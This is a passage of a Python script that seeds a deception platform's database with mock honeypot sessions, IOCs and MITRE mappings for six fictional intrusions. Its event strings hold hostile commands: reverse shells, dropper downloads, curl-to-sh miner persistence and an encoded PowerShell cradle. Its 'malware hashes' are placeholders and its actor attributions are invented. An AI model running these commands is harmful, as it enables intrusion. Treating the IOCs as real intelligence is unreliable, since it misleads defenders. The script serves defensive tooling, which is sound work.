"""
Database Seeding Script for Kurukshetra
Adaptive Cyber Deception & Threat Intelligence Platform

Seeds 6 realistic, diverse, multi-stage APT attack scenarios into MongoDB:
1. APT29 (Cozy Bear): SSH Infiltration, Cloud IAM Token Theft & Reverse Shell
2. FIN7: Web Application SQLi, Canary Honeytoken Trigger & Web Shell Staging
3. Lazarus Group: Redis Unauthorized Execution & Cryptominer Dropper
4. Mirai IoT Botnet: Telnet Default Credential Brute-Force & DDoS Daemon
5. Kubernetes Decoy: Pod ServiceAccount Token Theft & Secrets API Probing
6. RDP Gateway: Credential Stuffing, Financial Decoy Access & Lateral Movement
"""

import asyncio
import os
import hashlib
import json
from datetime import datetime, timezone, timedelta
from dotenv import load_dotenv
from motor.motor_asyncio import AsyncIOMotorClient

# Load environment
load_dotenv()
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb://127.0.0.1:27017")
DB_NAME = os.getenv("MONGODB_DB_NAME", "threat_intelligence")

now = datetime.now(timezone.utc)
def t(minutes_ago: int):
    return (now - timedelta(minutes=minutes_ago)).isoformat()

# --------------------------------------------------------------------------
# 1. ATTACK SESSIONS
# --------------------------------------------------------------------------
MOCK_SESSIONS = [
    {
        "session_id": "ATK-SSH-901",
        "source_ip": "185.220.101.5",
        "target_ip": "192.168.1.20",
        "service": "ssh",
        "start_time": t(60),
        "last_seen": t(15),
        "status": "CONTAINED",
        "risk_score": 95,
        "risk_level": "CRITICAL",
        "risk_breakdown": [
            "Brute-force SSH password guessing (+15)",
            "Authentication bypass with decoy honeytoken (+25)",
            "System & OS reconnaissance executed (+20)",
            "Cloud IAM metadata token exfiltration (+25)",
            "Malicious ingress tool download attempted (+20)",
            "Reverse shell interactive payload (+15)"
        ],
        "fingerprint": "SSH-CRED-RECON-DECOY-C3",
        "event_count": 12,
        "containment_info": {
            "status": "CONTAINED",
            "action": "ISOLATE",
            "reason": "Automated high-risk threshold (95/100) exceeded. Reverse shell and Cloud IAM theft detected.",
            "timestamp": t(14)
        }
    },
    {
        "session_id": "ATK-WEB-402",
        "source_ip": "45.154.255.89",
        "target_ip": "192.168.1.10",
        "service": "http",
        "start_time": t(45),
        "last_seen": t(5),
        "status": "ACTIVE",
        "risk_score": 90,
        "risk_level": "CRITICAL",
        "risk_breakdown": [
            "Directory fuzzing & sensitive file probes (+20)",
            "Honeytoken passwords.txt accessed (+25)",
            "SQL Injection payload in authentication endpoint (+25)",
            "Web shell dropper download via curl (+20)"
        ],
        "fingerprint": "HTTP-SQLI-DECOY-UPLOAD-F8",
        "event_count": 8,
        "containment_info": None
    },
    {
        "session_id": "ATK-REDIS-601",
        "source_ip": "198.51.100.44",
        "target_ip": "192.168.1.35",
        "service": "redis",
        "start_time": t(90),
        "last_seen": t(25),
        "status": "CONTAINED",
        "risk_score": 88,
        "risk_level": "CRITICAL",
        "risk_breakdown": [
            "Unauthorized Redis unauthenticated access (+20)",
            "CONFIG SET dir /var/spool/cron arbitrary write (+30)",
            "Cryptominer cronjob persistence injection (+30)"
        ],
        "fingerprint": "REDIS-CRON-MINER-LAZARUS",
        "event_count": 5,
        "containment_info": {
            "status": "CONTAINED",
            "action": "QUARANTINE_SOCKET",
            "reason": "Arbitrary cronjob file write attempt via unauthenticated Redis honeypot.",
            "timestamp": t(24)
        }
    },
    {
        "session_id": "ATK-K8S-505",
        "source_ip": "185.193.88.21",
        "target_ip": "192.168.1.50",
        "service": "kubernetes",
        "start_time": t(75),
        "last_seen": t(10),
        "status": "ACTIVE",
        "risk_score": 85,
        "risk_level": "CRITICAL",
        "risk_breakdown": [
            "Kubernetes API server anonymous port 6443 probe (+20)",
            "ServiceAccount token theft from /var/run/secrets (+25)",
            "Cluster-admin privilege escalation attempt (+30)"
        ],
        "fingerprint": "K8S-SECRETS-PROBE-APT",
        "event_count": 6,
        "containment_info": None
    },
    {
        "session_id": "ATK-RDP-108",
        "source_ip": "91.240.118.172",
        "target_ip": "192.168.1.15",
        "service": "rdp",
        "start_time": t(120),
        "last_seen": t(80),
        "status": "CONTAINED",
        "risk_score": 75,
        "risk_level": "HIGH",
        "risk_breakdown": [
            "Multiple failed NLA handshakes (+20)",
            "Decoy Administrator credential stuffing (+25)",
            "Honeyfile financial_q4_passwords.xlsx accessed (+25)"
        ],
        "fingerprint": "RDP-BRUTE-HONEYTOKEN-E5",
        "event_count": 5,
        "containment_info": {
            "status": "CONTAINED",
            "action": "BLOCK_IP",
            "reason": "Repeated credential stuffing against RDP gateway.",
            "timestamp": t(78)
        }
    },
    {
        "session_id": "ATK-TELNET-301",
        "source_ip": "103.152.220.44",
        "target_ip": "192.168.1.30",
        "service": "telnet",
        "start_time": t(240),
        "last_seen": t(210),
        "status": "CLOSED",
        "risk_score": 45,
        "risk_level": "MEDIUM",
        "risk_breakdown": [
            "Automated botnet dictionary scan (+20)",
            "Default IoT credentials attempted (root:vizxv) (+15)",
            "BusyBox wget payload delivery attempted (+15)"
        ],
        "fingerprint": "TELNET-MIRAI-SCAN-B1",
        "event_count": 4,
        "containment_info": None
    }
]

# --------------------------------------------------------------------------
# 2. HONEYPOT EVENTS
# --------------------------------------------------------------------------
MOCK_EVENTS = [
    # --- ATK-SSH-901 Events (APT29) ---
    {"event_id": "EVT-SSH-001", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(60), "event_type": "login_attempt", "event": "Failed password for root from 185.220.101.5 port 41234", "metadata": {"auth_status": "failed", "username": "root", "city": "Frankfurt", "country": "Germany", "country_code": "DE", "flag": "🇩🇪", "asn": "AS206238"}},
    {"event_id": "EVT-SSH-002", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(58), "event_type": "login_attempt", "event": "Failed password for admin from 185.220.101.5 port 41238", "metadata": {"auth_status": "failed", "username": "admin"}},
    {"event_id": "EVT-SSH-003", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(55), "event_type": "login_success", "event": "Accepted password for decoy_user from 185.220.101.5 port 41240 (Honeytoken Triggered)", "metadata": {"auth_status": "accepted", "honeytoken": True, "username": "decoy_user"}},
    {"event_id": "EVT-SSH-004", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(53), "event_type": "command", "event": "whoami", "metadata": {"user": "decoy_user"}},
    {"event_id": "EVT-SSH-005", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(51), "event_type": "command", "event": "uname -a", "metadata": {"user": "decoy_user"}},
    {"event_id": "EVT-SSH-006", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(48), "event_type": "command", "event": "cat /etc/passwd", "metadata": {"user": "decoy_user"}},
    {"event_id": "EVT-SSH-007", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(45), "event_type": "command", "event": "cat /root/.env (Honeytoken Canary File)", "metadata": {"canary_file": "/root/.env", "user": "decoy_user"}},
    {"event_id": "EVT-SSH-008", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(42), "event_type": "command", "event": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ (Cloud IAM Canary)", "metadata": {"tool": "curl", "cloud_meta": True}},
    {"event_id": "EVT-SSH-009", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(38), "event_type": "command", "event": "wget http://cdn.malicious-domain.cc/tools/dropper.sh -O /tmp/dropper.sh", "metadata": {"tool": "wget", "url": "http://cdn.malicious-domain.cc/tools/dropper.sh"}},
    {"event_id": "EVT-SSH-010", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(35), "event_type": "command", "event": "chmod +x /tmp/dropper.sh", "metadata": {"file": "/tmp/dropper.sh"}},
    {"event_id": "EVT-SSH-011", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(30), "event_type": "command", "event": "sudo -l", "metadata": {"priv_esc": True}},
    {"event_id": "EVT-SSH-012", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(20), "event_type": "command", "event": "nc -e /bin/bash 185.220.101.5 9001 (Reverse Shell Spawn)", "metadata": {"c2_ip": "185.220.101.5", "c2_port": 9001, "tool": "nc"}},

    # --- ATK-WEB-402 Events (FIN7) ---
    {"event_id": "EVT-WEB-001", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(45), "event_type": "web_probe", "event": "GET /robots.txt HTTP/1.1", "metadata": {"path": "/robots.txt", "method": "GET", "city": "Amsterdam", "country": "Netherlands", "country_code": "NL", "flag": "🇳🇱", "asn": "AS49981"}},
    {"event_id": "EVT-WEB-002", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(40), "event_type": "web_probe", "event": "GET /admin/passwords.txt HTTP/1.1 (Decoy Canary Access)", "metadata": {"canary_file": "/admin/passwords.txt", "method": "GET"}},
    {"event_id": "EVT-WEB-003", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(32), "event_type": "exploit_attempt", "event": "POST /api/login ' OR '1'='1' -- (SQL Injection)", "metadata": {"attack_vector": "SQLi", "payload": "' OR '1'='1' --"}},
    {"event_id": "EVT-WEB-004", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(28), "event_type": "exploit_attempt", "event": "GET /products?id=1 UNION SELECT null, username, password_hash FROM admin_users --", "metadata": {"attack_vector": "SQLi_UNION"}},
    {"event_id": "EVT-WEB-005", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(25), "event_type": "command", "event": "curl http://45.154.255.89/backdoor.php -o /var/www/html/backdoor.php", "metadata": {"file": "/var/www/html/backdoor.php", "tool": "curl", "url": "http://45.154.255.89/backdoor.php"}},
    {"event_id": "EVT-WEB-006", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(18), "event_type": "command", "event": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"45.154.255.89\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/bash\")'", "metadata": {"c2_ip": "45.154.255.89", "tool": "python3"}},
    {"event_id": "EVT-WEB-007", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(10), "event_type": "command", "event": "cat /var/www/html/config.php (Decoy DB credentials)", "metadata": {"honeytoken": True}},
    {"event_id": "EVT-WEB-008", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(5), "event_type": "command", "event": "nmap -sS -p 22,80,3306,5432,6379 192.168.1.0/24", "metadata": {"tool": "nmap", "scan_type": "syn"}},

    # --- ATK-REDIS-601 Events (Lazarus Group) ---
    {"event_id": "EVT-REDIS-001", "session_id": "ATK-REDIS-601", "source_ip": "198.51.100.44", "target_ip": "192.168.1.35", "service": "redis", "timestamp": t(90), "event_type": "command", "event": "INFO", "metadata": {"city": "Pyongyang", "country": "North Korea", "country_code": "KP", "flag": "🇰🇵", "asn": "AS131279"}},
    {"event_id": "EVT-REDIS-002", "session_id": "ATK-REDIS-601", "source_ip": "198.51.100.44", "target_ip": "192.168.1.35", "service": "redis", "timestamp": t(85), "event_type": "command", "event": "CONFIG SET dir /var/spool/cron/crontabs", "metadata": {"tamper": "cron_dir"}},
    {"event_id": "EVT-REDIS-003", "session_id": "ATK-REDIS-601", "source_ip": "198.51.100.44", "target_ip": "192.168.1.35", "service": "redis", "timestamp": t(80), "event_type": "command", "event": "CONFIG SET dbfilename root", "metadata": {"tamper": "dbfilename"}},
    {"event_id": "EVT-REDIS-004", "session_id": "ATK-REDIS-601", "source_ip": "198.51.100.44", "target_ip": "192.168.1.35", "service": "redis", "timestamp": t(75), "event_type": "command", "event": "SET miner \"\\n* * * * * curl -s http://198.51.100.44/xmrig.sh | sh\\n\"", "metadata": {"url": "http://198.51.100.44/xmrig.sh", "payload": "xmrig"}},
    {"event_id": "EVT-REDIS-005", "session_id": "ATK-REDIS-601", "source_ip": "198.51.100.44", "target_ip": "192.168.1.35", "service": "redis", "timestamp": t(70), "event_type": "command", "event": "SAVE", "metadata": {"action": "write_cron"}},

    # --- ATK-K8S-505 Events (Kubernetes Decoy) ---
    {"event_id": "EVT-K8S-001", "session_id": "ATK-K8S-505", "source_ip": "185.193.88.21", "target_ip": "192.168.1.50", "service": "kubernetes", "timestamp": t(75), "event_type": "web_probe", "event": "GET /api/v1/namespaces/default/pods HTTP/1.1", "metadata": {"city": "Zurich", "country": "Switzerland", "country_code": "CH", "flag": "🇨🇭", "asn": "AS51852"}},
    {"event_id": "EVT-K8S-002", "session_id": "ATK-K8S-505", "source_ip": "185.193.88.21", "target_ip": "192.168.1.50", "service": "kubernetes", "timestamp": t(65), "event_type": "command", "event": "cat /var/run/secrets/kubernetes.io/serviceaccount/token", "metadata": {"canary_file": "serviceaccount_token"}},
    {"event_id": "EVT-K8S-003", "session_id": "ATK-K8S-505", "source_ip": "185.193.88.21", "target_ip": "192.168.1.50", "service": "kubernetes", "timestamp": t(55), "event_type": "web_probe", "event": "GET /api/v1/namespaces/kube-system/secrets HTTP/1.1", "metadata": {"priv_esc": True}},
    {"event_id": "EVT-K8S-004", "session_id": "ATK-K8S-505", "source_ip": "185.193.88.21", "target_ip": "192.168.1.50", "service": "kubernetes", "timestamp": t(45), "event_type": "command", "event": "kubectl auth can-i create clusterrolebinding", "metadata": {"tool": "kubectl"}},
    {"event_id": "EVT-K8S-005", "session_id": "ATK-K8S-505", "source_ip": "185.193.88.21", "target_ip": "192.168.1.50", "service": "kubernetes", "timestamp": t(30), "event_type": "command", "event": "kubectl run privileged-pod --image=alpine --privileged --restart=Never", "metadata": {"container_escape": True}},
    {"event_id": "EVT-K8S-006", "session_id": "ATK-K8S-505", "source_ip": "185.193.88.21", "target_ip": "192.168.1.50", "service": "kubernetes", "timestamp": t(10), "event_type": "command", "event": "curl -O http://185.193.88.21/k8s_worm.elf && chmod +x k8s_worm.elf", "metadata": {"url": "http://185.193.88.21/k8s_worm.elf"}},

    # --- ATK-RDP-108 Events ---
    {"event_id": "EVT-RDP-001", "session_id": "ATK-RDP-108", "source_ip": "91.240.118.172", "target_ip": "192.168.1.15", "service": "rdp", "timestamp": t(120), "event_type": "login_attempt", "event": "NLA Handshake initiated from 91.240.118.172", "metadata": {"city": "Saint Petersburg", "country": "Russia", "country_code": "RU", "flag": "🇷🇺", "asn": "AS48282"}},
    {"event_id": "EVT-RDP-002", "session_id": "ATK-RDP-108", "source_ip": "91.240.118.172", "target_ip": "192.168.1.15", "service": "rdp", "timestamp": t(110), "event_type": "login_attempt", "event": "Failed RDP Auth for Administrator", "metadata": {"username": "Administrator"}},
    {"event_id": "EVT-RDP-003", "session_id": "ATK-RDP-108", "source_ip": "91.240.118.172", "target_ip": "192.168.1.15", "service": "rdp", "timestamp": t(100), "event_type": "login_success", "event": "Accepted RDP session for backup_admin (Honeytoken Credential)", "metadata": {"honeytoken": True, "username": "backup_admin"}},
    {"event_id": "EVT-RDP-004", "session_id": "ATK-RDP-108", "source_ip": "91.240.118.172", "target_ip": "192.168.1.15", "service": "rdp", "timestamp": t(90), "event_type": "command", "event": "C:\\Windows\\System32\\cmd.exe /c type C:\\Users\\Administrator\\Desktop\\financial_q4_passwords.xlsx", "metadata": {"canary_file": "financial_q4_passwords.xlsx"}},
    {"event_id": "EVT-RDP-005", "session_id": "ATK-RDP-108", "source_ip": "91.240.118.172", "target_ip": "192.168.1.15", "service": "rdp", "timestamp": t(80), "event_type": "command", "event": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgA0ADAALgAxADEAOAAuADEANwAyAC8AbQBpAG0AaQBrAGEAdAB6AC4AcABzADEAJwApAA==", "metadata": {"tool": "powershell", "obfuscated": True}},

    # --- ATK-TELNET-301 Events (Mirai) ---
    {"event_id": "EVT-TEL-001", "session_id": "ATK-TELNET-301", "source_ip": "103.152.220.44", "target_ip": "192.168.1.30", "service": "telnet", "timestamp": t(240), "event_type": "login_attempt", "event": "Login attempt: root / vizxv (Mirai Botnet Default)", "metadata": {"city": "Hanoi", "country": "Vietnam", "country_code": "VN", "flag": "🇻🇳", "asn": "AS7643"}},
    {"event_id": "EVT-TEL-002", "session_id": "ATK-TELNET-301", "source_ip": "103.152.220.44", "target_ip": "192.168.1.30", "service": "telnet", "timestamp": t(230), "event_type": "login_success", "event": "Telnet session granted to root (Decoy IoT Shell)", "metadata": {"honeytoken": True}},
    {"event_id": "EVT-TEL-003", "session_id": "ATK-TELNET-301", "source_ip": "103.152.220.44", "target_ip": "192.168.1.30", "service": "telnet", "timestamp": t(220), "event_type": "command", "event": "enable; shell; sh", "metadata": {"tool": "busybox"}},
    {"event_id": "EVT-TEL-004", "session_id": "ATK-TELNET-301", "source_ip": "103.152.220.44", "target_ip": "192.168.1.30", "service": "telnet", "timestamp": t(210), "event_type": "command", "event": "cd /tmp || cd /var/run || cd /dev/shm; busybox wget http://103.152.220.44/bins/mirai.arm; chmod 777 mirai.arm; ./mirai.arm", "metadata": {"url": "http://103.152.220.44/bins/mirai.arm", "tool": "busybox"}}
]

# --------------------------------------------------------------------------
# 3. INDICATORS OF COMPROMISE (IOCs)
# --------------------------------------------------------------------------
MOCK_IOCS = [
    {"value": "185.220.101.5", "ioc_type": "ip", "threat_category": "ATTACKER_SOURCE", "confidence": "HIGH", "session_ids": ["ATK-SSH-901"], "source_ips": ["185.220.101.5"], "first_seen": t(60), "last_seen": t(15), "notes": "APT29 Tor exit node scanning decoy SSH"},
    {"value": "45.154.255.89", "ioc_type": "ip", "threat_category": "ATTACKER_SOURCE", "confidence": "CRITICAL", "session_ids": ["ATK-WEB-402"], "source_ips": ["45.154.255.89"], "first_seen": t(45), "last_seen": t(5), "notes": "FIN7 bulletproof VPS hosting SQLi exploits"},
    {"value": "198.51.100.44", "ioc_type": "ip", "threat_category": "ATTACKER_SOURCE", "confidence": "CRITICAL", "session_ids": ["ATK-REDIS-601"], "source_ips": ["198.51.100.44"], "first_seen": t(90), "last_seen": t(25), "notes": "Lazarus Group infrastructure staging XMRig miner"},
    {"value": "185.193.88.21", "ioc_type": "ip", "threat_category": "ATTACKER_SOURCE", "confidence": "HIGH", "session_ids": ["ATK-K8S-505"], "source_ips": ["185.193.88.21"], "first_seen": t(75), "last_seen": t(10), "notes": "Kubernetes cluster scanner and token thief"},
    {"value": "91.240.118.172", "ioc_type": "ip", "threat_category": "ATTACKER_SOURCE", "confidence": "HIGH", "session_ids": ["ATK-RDP-108"], "source_ips": ["91.240.118.172"], "first_seen": t(120), "last_seen": t(80), "notes": "RDP credential brute-force scanner"},
    {"value": "103.152.220.44", "ioc_type": "ip", "threat_category": "ATTACKER_SOURCE", "confidence": "MEDIUM", "session_ids": ["ATK-TELNET-301"], "source_ips": ["103.152.220.44"], "first_seen": t(240), "last_seen": t(210), "notes": "Mirai botnet zombie CNC staging host"},
    {"value": "http://cdn.malicious-domain.cc/tools/dropper.sh", "ioc_type": "url", "threat_category": "PAYLOAD_DELIVERY", "confidence": "CRITICAL", "session_ids": ["ATK-SSH-901"], "source_ips": ["185.220.101.5"], "first_seen": t(38), "last_seen": t(38), "notes": "Linux dropper script URL"},
    {"value": "http://45.154.255.89/backdoor.php", "ioc_type": "url", "threat_category": "PAYLOAD_DELIVERY", "confidence": "CRITICAL", "session_ids": ["ATK-WEB-402"], "source_ips": ["45.154.255.89"], "first_seen": t(25), "last_seen": t(25), "notes": "PHP Web Shell download staging"},
    {"value": "http://198.51.100.44/xmrig.sh", "ioc_type": "url", "threat_category": "PAYLOAD_DELIVERY", "confidence": "CRITICAL", "session_ids": ["ATK-REDIS-601"], "source_ips": ["198.51.100.44"], "first_seen": t(75), "last_seen": t(75), "notes": "Cryptomining deployment shell script"},
    {"value": "http://185.193.88.21/k8s_worm.elf", "ioc_type": "url", "threat_category": "PAYLOAD_DELIVERY", "confidence": "CRITICAL", "session_ids": ["ATK-K8S-505"], "source_ips": ["185.193.88.21"], "first_seen": t(10), "last_seen": t(10), "notes": "Kubernetes lateral worm binary"},
    {"value": "http://103.152.220.44/bins/mirai.arm", "ioc_type": "url", "threat_category": "PAYLOAD_DELIVERY", "confidence": "CRITICAL", "session_ids": ["ATK-TELNET-301"], "source_ips": ["103.152.220.44"], "first_seen": t(210), "last_seen": t(210), "notes": "Mirai botnet ARM binary payload"},
    {"value": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "ioc_type": "hash_sha256", "threat_category": "MALWARE_HASH", "confidence": "HIGH", "session_ids": ["ATK-SSH-901"], "source_ips": ["185.220.101.5"], "first_seen": t(38), "last_seen": t(38), "notes": "SHA256 signature of dropper.sh payload"},
    {"value": "5d41402abc4b2a76b9719d911017c592", "ioc_type": "hash_md5", "threat_category": "MALWARE_HASH", "confidence": "HIGH", "session_ids": ["ATK-WEB-402"], "source_ips": ["45.154.255.89"], "first_seen": t(25), "last_seen": t(25), "notes": "MD5 hash of backdoor.php web shell"},
    {"value": "nc", "ioc_type": "tool", "threat_category": "OFFENSIVE_TOOL", "confidence": "CRITICAL", "session_ids": ["ATK-SSH-901"], "source_ips": ["185.220.101.5"], "first_seen": t(20), "last_seen": t(20), "notes": "Netcat reverse shell binary"},
    {"value": "nmap", "ioc_type": "tool", "threat_category": "OFFENSIVE_TOOL", "confidence": "HIGH", "session_ids": ["ATK-WEB-402"], "source_ips": ["45.154.255.89"], "first_seen": t(5), "last_seen": t(5), "notes": "Network exploration and port scanner"},
    {"value": "kubectl", "ioc_type": "tool", "threat_category": "OFFENSIVE_TOOL", "confidence": "HIGH", "session_ids": ["ATK-K8S-505"], "source_ips": ["185.193.88.21"], "first_seen": t(45), "last_seen": t(45), "notes": "Kubernetes cluster administrative tool"},
    {"value": "mimikatz", "ioc_type": "tool", "threat_category": "OFFENSIVE_TOOL", "confidence": "CRITICAL", "session_ids": ["ATK-RDP-108"], "source_ips": ["91.240.118.172"], "first_seen": t(80), "last_seen": t(80), "notes": "Memory credential dumping tool invoked via PowerShell"},
    {"value": "/root/.env", "ioc_type": "file", "threat_category": "HONEYTOKEN_CANARY", "confidence": "CRITICAL", "session_ids": ["ATK-SSH-901"], "source_ips": ["185.220.101.5"], "first_seen": t(45), "last_seen": t(45), "notes": "Decoy honeytoken file containing fake AWS credentials"},
    {"value": "/admin/passwords.txt", "ioc_type": "file", "threat_category": "HONEYTOKEN_CANARY", "confidence": "CRITICAL", "session_ids": ["ATK-WEB-402"], "source_ips": ["45.154.255.89"], "first_seen": t(40), "last_seen": t(40), "notes": "Decoy breadcrumb password file accessed"}
]

# --------------------------------------------------------------------------
# 4. MITRE MAPPINGS
# --------------------------------------------------------------------------
MOCK_MITRE = [
    {"session_id": "ATK-SSH-901", "technique_id": "T1110.001", "technique_name": "Password Guessing", "tactic": "Credential Access", "evidence": "Failed password for root/admin repeatedly", "timestamp": t(58)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1078", "technique_name": "Valid Accounts", "tactic": "Initial Access", "evidence": "Accepted password for decoy_user", "timestamp": t(55)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1033", "technique_name": "System Owner/User Discovery", "tactic": "Discovery", "evidence": "whoami", "timestamp": t(53)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1082", "technique_name": "System Information Discovery", "tactic": "Discovery", "evidence": "uname -a", "timestamp": t(51)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1087.001", "technique_name": "Local Accounts", "tactic": "Discovery", "evidence": "cat /etc/passwd", "timestamp": t(48)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1552.001", "technique_name": "Credentials in Files", "tactic": "Credential Access", "evidence": "cat /root/.env", "timestamp": t(45)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1552.005", "technique_name": "Cloud Instance Metadata API", "tactic": "Credential Access", "evidence": "curl http://169.254.169.254/latest/meta-data/", "timestamp": t(42)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1105", "technique_name": "Ingress Tool Transfer", "tactic": "Command and Control", "evidence": "wget http://cdn.malicious-domain.cc/tools/dropper.sh", "timestamp": t(38)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1222.002", "technique_name": "Linux Permissions Modification", "tactic": "Defense Evasion", "evidence": "chmod +x /tmp/dropper.sh", "timestamp": t(35)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1548.003", "technique_name": "Sudo and Sudo Caching", "tactic": "Privilege Escalation", "evidence": "sudo -l", "timestamp": t(30)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1059.004", "technique_name": "Unix Shell", "tactic": "Execution", "evidence": "nc -e /bin/bash 185.220.101.5 9001", "timestamp": t(20)},

    {"session_id": "ATK-WEB-402", "technique_id": "T1190", "technique_name": "Exploit Public-Facing Application", "tactic": "Initial Access", "evidence": "POST /api/login ' OR '1'='1' --", "timestamp": t(32)},
    {"session_id": "ATK-WEB-402", "technique_id": "T1552.001", "technique_name": "Credentials in Files", "tactic": "Credential Access", "evidence": "GET /admin/passwords.txt", "timestamp": t(40)},
    {"session_id": "ATK-WEB-402", "technique_id": "T1505.003", "technique_name": "Web Shell", "tactic": "Persistence", "evidence": "curl http://45.154.255.89/backdoor.php -o /var/www/html/backdoor.php", "timestamp": t(25)},
    {"session_id": "ATK-WEB-402", "technique_id": "T1046", "technique_name": "Network Service Discovery", "tactic": "Discovery", "evidence": "nmap -sS 192.168.1.0/24", "timestamp": t(5)},

    {"session_id": "ATK-REDIS-601", "technique_id": "T1053.003", "technique_name": "Cron", "tactic": "Persistence", "evidence": "CONFIG SET dir /var/spool/cron", "timestamp": t(85)},
    {"session_id": "ATK-REDIS-601", "technique_id": "T1496", "technique_name": "Resource Hijacking", "tactic": "Impact", "evidence": "SET miner curl http://198.51.100.44/xmrig.sh", "timestamp": t(75)},

    {"session_id": "ATK-K8S-505", "technique_id": "T1613", "technique_name": "Container and Resource Discovery", "tactic": "Discovery", "evidence": "GET /api/v1/namespaces/default/pods", "timestamp": t(75)},
    {"session_id": "ATK-K8S-505", "technique_id": "T1611", "technique_name": "Escape to Host", "tactic": "Privilege Escalation", "evidence": "kubectl run privileged-pod --privileged", "timestamp": t(30)},

    {"session_id": "ATK-RDP-108", "technique_id": "T1110.003", "technique_name": "Password Spraying", "tactic": "Credential Access", "evidence": "Accepted RDP session for backup_admin", "timestamp": t(100)},
    {"session_id": "ATK-RDP-108", "technique_id": "T1003.001", "technique_name": "LSASS Memory", "tactic": "Credential Access", "evidence": "powershell mimikatz.ps1", "timestamp": t(80)},

    {"session_id": "ATK-TELNET-301", "technique_id": "T1110.001", "technique_name": "Password Guessing", "tactic": "Credential Access", "evidence": "root / vizxv Mirai botnet default", "timestamp": t(240)},
    {"session_id": "ATK-TELNET-301", "technique_id": "T1059.004", "technique_name": "Unix Shell", "tactic": "Execution", "evidence": "enable; shell; sh", "timestamp": t(220)}
]

# --------------------------------------------------------------------------
# 5. ATTACKER PROFILES
# --------------------------------------------------------------------------
MOCK_ATTACKERS = [
    {
        "attacker_id": "ACTOR-APT29-COZY",
        "source_ips": ["185.220.101.5"],
        "session_ids": ["ATK-SSH-901"],
        "total_events": 12,
        "first_seen": t(180),
        "last_seen": t(15),
        "max_risk_score": 95,
        "fingerprints": ["SSH-CRED-RECON-DECOY-C3"],
        "primary_tactics": ["Initial Access", "Credential Access", "Discovery", "Privilege Escalation", "Command and Control"],
        "associated_services": ["ssh"],
        "country": "Germany (Tor Relay)",
        "threat_level": "CRITICAL",
        "known_actor_notes": "Suspected APT29 (Cozy Bear) reconnaissance & cloud token harvest campaign"
    },
    {
        "attacker_id": "ACTOR-FIN7-WEBSHOP",
        "source_ips": ["45.154.255.89"],
        "session_ids": ["ATK-WEB-402"],
        "total_events": 8,
        "first_seen": t(90),
        "last_seen": t(5),
        "max_risk_score": 90,
        "fingerprints": ["HTTP-SQLI-DECOY-UPLOAD-F8"],
        "primary_tactics": ["Initial Access", "Persistence", "Credential Access", "Command and Control", "Discovery"],
        "associated_services": ["http"],
        "country": "Netherlands (Bulletproof VPS)",
        "threat_level": "CRITICAL",
        "known_actor_notes": "FIN7 syndicate targeting e-commerce web applications with automated SQLi & web shell droppers"
    },
    {
        "attacker_id": "ACTOR-LAZARUS-CRYPTO",
        "source_ips": ["198.51.100.44"],
        "session_ids": ["ATK-REDIS-601"],
        "total_events": 5,
        "first_seen": t(100),
        "last_seen": t(25),
        "max_risk_score": 88,
        "fingerprints": ["REDIS-CRON-MINER-LAZARUS"],
        "primary_tactics": ["Initial Access", "Persistence", "Impact"],
        "associated_services": ["redis"],
        "country": "North Korea (State Proxy)",
        "threat_level": "CRITICAL",
